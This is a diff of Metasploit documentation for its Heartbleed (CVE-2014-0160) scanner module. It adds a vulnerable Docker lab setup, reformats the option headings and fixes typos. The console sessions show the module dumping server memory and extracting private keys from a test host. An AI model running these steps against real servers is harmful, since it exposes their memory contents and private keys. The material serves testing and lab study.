@@ -25,6 +25,35 @@ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -node
 If you receive `gethostbyname failure` error in `openssl`, add the client (metasploit)
 IP and hostname to your hosts file.
 
+### Using docker
+
+Using the environment created by [vulhub](https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160)
+
+First create a new docker-compose file:
+
+```
+version: '2'
+services:
+ nginx:
+   image: vulhub/openssl:1.0.1c-with-nginx
+   ports:
+    - "8080:80"
+    - "8443:443"
+```
+
+Then run `docker-compose up` and verify that the service is running with:
+
+```
+$ curl https://localhost:8443 -k
+<html>
+<head><title>404 Not Found</title></head>
+<body bgcolor="white">
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx/1.11.13</center>
+</body>
+</html>
+```
+
 ## Verification Steps
 
   1. Install a vulnerable OpenSSL, start the service
@@ -36,38 +65,38 @@ IP and hostname to your hosts file.
 
 ## Options
 
-  **Action**
+### Action
 
   * SCAN: Scan the host to see if it is vulnerable.  If `verbose` is set to `true`, also print the memory that was dumped.  This is the default.
   * DUMP: Dump the memory and store it as loot.
   * KEYS: Similar to DUMP but scan the results for the private key.
 
-  **TLS_CALLBACK**
+### TLS_CALLBACK
 
   Protocol to use if a specific underlying protocol is required.  Default is `None`.
 
-  **TLS_VERSION**
+### TLS_VERSION
 
-  The specific version of TLS (or SSL) to use, if only specific ones are avaialble.  Defaults to `1.0` (TLS1.0).
+  The specific version of TLS (or SSL) to use, if only specific ones are available.  Defaults to `1.0` (TLS1.0).
 
-  **MAX_KEYTRIES**
+### MAX_KEYTRIES
 
   If Action is set to `KEYS`, the maximum amount of times to dump memory and attempt to retrieve the private key.
   Similar to `LEAK_COUNT` but only applies to `KEYS`.  Default is `50`.
 
-  **STATUS_EVERY**
+### STATUS_EVERY
 
   If Action is set to `KEYS`, how often the status should be printed.  Default is `5`.
 
-  **DUMPFILTER**
+### DUMPFILTER
 
-  A regular expresion (used in scan function) to use to filter the dump before storing.  Default is `nil`.
+  A regular expression (used in scan function) to use to filter the dump before storing.  Default is `nil`.
 
-  **RESPONSE_TIMEOUT**
+### RESPONSE_TIMEOUT
 
   How long to wait for the server to respond in seconds.  Default is `10`.
 
-  **LEAK_COUNT**
+### LEAK_COUNT
 
   If Action is set to `SCAN` or `DUMP`, the maximum amount of times to dump memory.
   Similar to `MAX_KEYTRIES`.  Default is `1`.
@@ -89,12 +118,12 @@ IP and hostname to your hosts file.
 With the default action of `SCAN` we can determine if the server is vulnerable or not.
 
 ```
-msf5 > use auxiliary/scanner/ssl/openssl_heartbleed 
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set rhosts 222.222.2.222
+msf > use auxiliary/scanner/ssl/openssl_heartbleed 
+msf auxiliary(scanner/ssl/openssl_heartbleed) > set rhosts 222.222.2.222
 rhosts => 222.222.2.222
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set rport 44330
+msf auxiliary(scanner/ssl/openssl_heartbleed) > set rport 44330
 rport => 44330
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run
+msf auxiliary(scanner/ssl/openssl_heartbleed) > run
 
 [+] 222.222.2.222:44330   - Heartbeat response with leak, 65535 bytes
 [*] 222.222.2.222:44330   - Scanned 1 of 1 hosts (100% complete)
@@ -111,9 +140,9 @@ watch 'cat openssl-1.0.1d/key.pem; cat openssl-1.0.1d/cert.pem'
 ```
 
 ```
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set action KEYS
+msf auxiliary(scanner/ssl/openssl_heartbleed) > set action KEYS
 action => KEYS
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run
+msf auxiliary(scanner/ssl/openssl_heartbleed) > run
 
 [*] 222.222.2.222:44330   - Scanning for private keys
 [*] 222.222.2.222:44330   - Getting public key constants...
@@ -156,15 +185,15 @@ FbawD4i1LZxrihOuuy3nt34hIlprjtW2WV49NiWnbwEzZo6ejm5NRg==
 ### DUMP against s_server on Ubuntu 18.04 with OpenSSL 1.0.1d
 
 ```
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
+msf auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
 action => DUMP
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run
+msf auxiliary(scanner/ssl/openssl_heartbleed) > run
 
 [+] 222.222.2.222:44330   - Heartbeat response with leak, 65535 bytes
 [+] 222.222.2.222:44330   - Heartbeat data stored in /root/.msf4/loot/20191012213447_default_222.222.2.222_openssl.heartble_500776.bin
 [*] 222.222.2.222:44330   - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > cat /root/.msf4/loot/20191012213447_default_222.222.2.222_openssl.heartble_500776.bin
+msf auxiliary(scanner/ssl/openssl_heartbleed) > cat /root/.msf4/loot/20191012213447_default_222.222.2.222_openssl.heartble_500776.bin
 [*] exec: cat /root/.msf4/loot/20191012213447_default_222.222.2.222_openssl.heartble_500776.bin
 
 ���]�O���g�hE�_.[�MT��b��΋k�f��
@@ -325,12 +354,12 @@ Because arbitrary memory is dumped, a high volume application that uses openSSL 
 fairly often. The `repeat` command can be used to execute the module multiple times.
 
 ```
-msf5 > use auxiliary/scanner/ssl/openssl_heartbleed
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set rhosts 222.222.2.222
+msf > use auxiliary/scanner/ssl/openssl_heartbleed
+msf auxiliary(scanner/ssl/openssl_heartbleed) > set rhosts 222.222.2.222
 rhosts => 222.222.2.222
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
+msf auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
 action => DUMP
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > repeat -n 10 run
+msf auxiliary(scanner/ssl/openssl_heartbleed) > repeat -n 10 run
 
 [*] 222.222.2.222:443     - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
